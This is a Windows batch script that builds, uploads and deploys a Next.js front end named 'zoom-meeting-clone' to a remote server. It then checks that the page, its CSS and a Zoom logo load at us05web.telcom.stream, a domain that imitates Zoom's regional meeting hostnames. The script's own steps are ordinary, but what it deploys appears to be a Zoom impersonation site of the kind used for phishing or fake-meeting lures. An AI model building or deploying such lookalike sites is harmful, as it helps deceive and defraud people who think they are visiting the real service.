@echo off
setlocal EnableDelayedExpansion
cd /d "%~dp0"

set HOST=147.224.213.55
set USER=opc
set APP=/opt/betterdesk/us05web
set SRC=zoom-meeting-clone\Zoom-front-page
set STAGE=%TEMP%\us05web_deploy
set TAR=%TEMP%\us05web.tar.gz

if not exist "%SRC%\.next\standalone\server.js" if not exist "%SRC%\.next\standalone\zoom-meeting-clone\Zoom-front-page\server.js" (
    echo ERROR: No standalone build found in "%SRC%\.next\standalone".
    echo Run first:  cd "%SRC%" ^&^& npm run build
    exit /b 1
)

echo [1/6] Staging flattened build...
rd /s /q "%STAGE%" 2>nul & mkdir "%STAGE%" 2>nul
if exist "%SRC%\.next\standalone\server.js" (
    robocopy "%SRC%\.next\standalone" "%STAGE%" /E /NFL /NDL /NJH /NP /MT:8
) else (
    robocopy "%SRC%\.next\standalone\zoom-meeting-clone\Zoom-front-page" "%STAGE%" /E /NFL /NDL /NJH /NP /MT:8
    robocopy "%SRC%\.next\standalone\zoom-meeting-clone\node_modules" "%STAGE%\node_modules" /E /NFL /NDL /NJH /NP /MT:8
)
if errorlevel 8 ( echo ERROR: staging failed & exit /b 1 )

echo [2/6] Adding public/ and .next/static/ assets...
robocopy "%SRC%\public" "%STAGE%\public" /E /NFL /NDL /NJH /NP
robocopy "%SRC%\.next\static" "%STAGE%\.next\static" /E /NFL /NDL /NJH /NP
if errorlevel 8 ( echo ERROR: asset copy failed & exit /b 1 )

echo [3/6] Packing tarball...
del "%TAR%" 2>nul
tar -czf "%TAR%" -C "%STAGE%" .
if errorlevel 1 ( echo ERROR: tar failed & exit /b 1 )

echo [4/6] Uploading to %USER%@%HOST%...
scp -o ConnectTimeout=20 "%TAR%" %USER%@%HOST%:/tmp/us05web.tar.gz
if errorlevel 1 ( echo ERROR: upload failed & exit /b 1 )
scp -o ConnectTimeout=20 "deploy\oci\us05web-swap.sh" %USER%@%HOST%:/tmp/us05web-swap.sh
if errorlevel 1 ( echo ERROR: script upload failed & exit /b 1 )

echo [5/6] Swapping app dir and restarting services...
ssh -o ConnectTimeout=20 %USER%@%HOST% "tr -d '\r' </tmp/us05web-swap.sh >/tmp/us05web-swap.lf.sh && bash /tmp/us05web-swap.lf.sh"
if errorlevel 1 ( echo ERROR: remote swap failed & exit /b 1 )

echo [6/6] Verifying public URL...
curl.exe -s -o NUL -w "public css:   %%{http_code}\n" "https://us05web.telcom.stream/_next/static/chunks/3a4z5o4q-2apj.css"
curl.exe -s -o NUL -w "public logo:  %%{http_code}\n" "https://us05web.telcom.stream/sites/zoom/zoom-logo.svg"
curl.exe -s -o NUL -w "public page:  %%{http_code}\n" "https://us05web.telcom.stream/"

echo.
echo DEPLOY COMPLETE - https://us05web.telcom.stream is serving the new UI.
rd /s /q "%STAGE%" 2>nul
